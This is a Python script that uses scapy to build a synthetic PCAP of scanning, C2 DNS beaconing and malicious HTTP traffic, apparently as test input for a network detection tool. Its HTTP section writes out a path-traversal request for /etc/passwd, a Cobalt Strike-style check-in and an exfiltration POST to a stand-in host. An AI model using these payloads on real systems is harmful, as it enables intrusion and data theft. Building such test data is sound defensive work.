#!/usr/bin/env python3
"""Generates a synthetic test PCAP containing TCP port scanning, C2 DNS beaconing, and malicious HTTP requests."""
from pathlib import Path
from scapy.all import DNS, DNSQR, IP, TCP, UDP, Ether, Raw, wrpcap


def generate_pcap(out_path: Path):
    out_path.parent.mkdir(parents=True, exist_ok=True)
    pkts = []
    base_ts = 1763740000.0

    # 1. Port Scan from 10.20.30.99 against 10.20.30.10 across 12 TCP ports
    for idx, dport in enumerate([21, 22, 23, 25, 80, 110, 139, 443, 445, 3306, 3389, 8080]):
        p = Ether() / IP(src="10.20.30.99", dst="10.20.30.10") / TCP(sport=45000 + idx, dport=dport, flags="S")
        p.time = base_ts + idx * 0.05
        pkts.append(p)

    # 2. Periodic C2 DNS Beaconing every 60.0 seconds from 10.20.30.55 to c2-beacon.darkops-sync.example
    for i in range(6):
        p = (
            Ether()
            / IP(src="10.20.30.55", dst="8.8.8.8")
            / UDP(sport=53000 + i, dport=53)
            / DNS(rd=1, qd=DNSQR(qname="c2-beacon.darkops-sync.example"))
        )
        p.time = base_ts + 10.0 + (i * 60.0)
        pkts.append(p)

    # 3. Normal DNS query from 10.20.30.15
    p_norm = (
        Ether()
        / IP(src="10.20.30.15", dst="8.8.8.8")
        / UDP(sport=54111, dport=53)
        / DNS(rd=1, qd=DNSQR(qname="updates.ubuntu.com"))
    )
    p_norm.time = base_ts + 15.0
    pkts.append(p_norm)

    # 4. Suspicious HTTP Requests (curl/sqlmap User-Agents, C2 checkin, /etc/passwd LFI)
    http_payloads = [
        (
            "10.20.30.55",
            "198.51.100.77",
            80,
            b"GET /stage2/beacon_checkin.php?id=host55 HTTP/1.1\r\nHost: c2-beacon.darkops-sync.example\r\nUser-Agent: Mozilla/5.0 (CobaltStrike/4.9)\r\n\r\n",
            base_ts + 25.0,
        ),
        (
            "10.20.30.99",
            "10.20.30.10",
            80,
            b"GET /admin/export.php?file=../../../../etc/passwd HTTP/1.1\r\nHost: 10.20.30.10\r\nUser-Agent: sqlmap/1.8.7#stable (https://sqlmap.org)\r\n\r\n",
            base_ts + 30.0,
        ),
        (
            "10.20.30.55",
            "198.51.100.77",
            80,
            b"POST /exfil/upload HTTP/1.1\r\nHost: 198.51.100.77\r\nUser-Agent: curl/8.5.0\r\nContent-Length: 18\r\n\r\nuser=root&hash=abc",
            base_ts + 95.0,
        ),
    ]
    for idx, (src, dst, dport, raw_http, ts) in enumerate(http_payloads):
        p = Ether() / IP(src=src, dst=dst) / TCP(sport=51000 + idx, dport=dport, flags="PA") / Raw(load=raw_http)
        p.time = ts
        pkts.append(p)

    wrpcap(str(out_path), pkts)
    print(f"Generated {len(pkts)} packets in {out_path}")


if __name__ == "__main__":
    generate_pcap(Path(__file__).parent.parent / "input_pcaps/sample.pcap")
